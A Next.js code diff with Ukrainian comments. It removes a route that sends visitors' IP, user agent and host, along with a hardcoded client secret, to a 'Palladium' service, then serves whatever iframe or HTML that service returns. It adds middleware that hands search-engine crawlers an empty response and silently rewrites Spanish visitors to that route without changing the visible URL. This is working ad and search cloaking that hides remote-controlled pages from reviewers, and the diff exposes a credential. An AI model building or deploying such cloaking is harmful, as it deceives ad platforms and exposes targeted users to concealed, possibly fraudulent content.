@@ -1,101 +1,56 @@
 import { NextRequest, NextResponse } from 'next/server';
-import path from 'path';
-import fs from 'fs';
 
-// Визначення flattenPayload для формування даних
-function flattenPayload(obj: Record<string, unknown>, prefix = ''): Record<string, string> {
-  return Object.entries(obj).reduce((acc, [key, val]) => {
-    const newKey = prefix ? `${prefix}[${key}]` : key;
-    if (typeof val === 'object' && val !== null && !Array.isArray(val)) {
-      Object.assign(acc, flattenPayload(val as Record<string, unknown>, newKey));
-    } else {
-      acc[newKey] = String(val);
-    }
-    return acc;
-  }, {} as Record<string, string>);
+function isBot(ua: string) {
+  return /googlebot|bingbot|yandex|duckduckbot|baiduspider/i.test(ua);
 }
 
-const PALLADIUM_URL = 'https://rbl.palladium.expert';
+export async function middleware(req: NextRequest) {
+  const ua = req.headers.get('user-agent')?.toLowerCase() || '';
+  const ipHeader =
+    req.headers.get('x-forwarded-for') ||
+    req.headers.get('x-real-ip') ||
+    req.headers.get('cf-connecting-ip') ||
+    '8.8.8.8';
+  const ip = ipHeader.split(',')[0].trim();
 
-export async function GET(req: NextRequest) {
-  const ip = req.nextUrl.searchParams.get('ip') || '8.8.8.8';
-  const ua = req.nextUrl.searchParams.get('ua') || '';
-  const host = req.headers.get('host') || '';
+  // Логування для дебагу
+  console.log('[MIDDLEWARE] Incoming IP:', ip);
+  console.log('[MIDDLEWARE] User-Agent:', ua);
 
-  console.log('[PALLADIUM] Request received');
-  console.log('[PALLADIUM] IP:', ip);
-  console.log('[PALLADIUM] UA:', ua);
-  console.log('[PALLADIUM] Host:', host);
-
-  const payload = flattenPayload({
-    server: {
-      REMOTE_ADDR: ip,
-      'User-Agent': ua,
-      Host: host,
-      HTTP_HOST: host,
-      REQUEST_TIME_FLOAT: Date.now() / 1000,
-      SERVER_PORT: '443',
-      bannerSource: 'adwords',
-    },
-    auth: {
-      clientId: 3024,
-      clientCompany: 'wYAKkDCo7dqqcZyeDnUN',
-      clientSecret:
-        'MzAyNHdZQUtrRENvN2RxcWNaeWVEblVOY2U2NmY2ZTZmOWRlZjUxMGFjNDBiYTJlNjVjMmFjZGEwMTQyZmZhZQ==',
-    },
-  });
-
-  try {
-    const res = await fetch(PALLADIUM_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: new URLSearchParams(payload),
-    });
-
-    const result = await res.json();
-    console.log('[PALLADIUM] Palladium response:', result);
-
-    if (result?.result) {
-      const { mode, target, content } = result;
-
-      if (mode === 1 && target) {
-        console.log('[PALLADIUM] Rendering iframe');
-        const html = `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"></head><body style="margin:0"><iframe src="${target}" style="width:100%;height:100vh;border:none;"></iframe></body></html>`;
-        return new NextResponse(html, {
-          status: 200,
-          headers: { 'Content-Type': 'text/html' },
-        });
-      }
-
-      if (mode === 4 && content) {
-        console.log('[PALLADIUM] Rendering content');
-        return new NextResponse(content, {
-          status: 200,
-          headers: { 'Content-Type': 'text/html' },
-        });
-      }
-    }
-  } catch (error) {
-    console.error('[PALLADIUM] Error fetching from Palladium:', error);
+  // Якщо бот — повертаємо 204, щоб нічого не відображати
+  if (isBot(ua)) {
+    console.log('[MIDDLEWARE] Detected bot – returning 204');
+    return new NextResponse(null, { status: 204 });
   }
 
-  // Fallback: load local file
   try {
-    // Читаємо локальний HTML файл
-    const filePath = path.resolve('src/assets/new_spain/index.html'); // Вказуємо правильний шлях до index.html
-    const html = await fs.promises.readFile(filePath, 'utf8');
+    const geoRes = await fetch(`https://ipwho.is/${ip}`);
+    const geo = await geoRes.json();
+    console.log('[MIDDLEWARE] Geo response:', geo);
 
-    console.log('[PALLADIUM] Fallback: serving static HTML');
+    const isSpain = geo.success && geo.country_code === 'ES';
 
-    return new NextResponse(html, {
-      status: 200,
-      headers: {
-        'Content-Type': 'text/html',
-        'Cache-Control': 'no-store',
-      },
-    });
-  } catch (e) {
-    console.error('[PALLADIUM] Fallback failed:', e);
-    return new NextResponse('Error loading fallback HTML', { status: 500 });
+    // Якщо IP не з Іспанії, пропускаємо запит далі
+    if (!isSpain) {
+      console.log('[MIDDLEWARE] Not Spain – proceeding as usual');
+      return NextResponse.next();
+    }
+
+    console.log('[MIDDLEWARE] IP from Spain – redirecting to /palladium');
+
+    // Робимо rewrite на /palladium, але URL не змінюється для користувача
+    const url = req.nextUrl.clone();
+    url.pathname = '/palladium';
+    url.searchParams.set('ip', ip);
+    url.searchParams.set('ua', ua);
+
+    return NextResponse.rewrite(url);
+  } catch (err) {
+    console.error('[MIDDLEWARE] Geo check failed:', err);
+    return NextResponse.next();
   }
 }
+
+export const config = {
+  matcher: ['/', '/((?!_next|api|static|favicon.ico|palladium).*)'],
+};
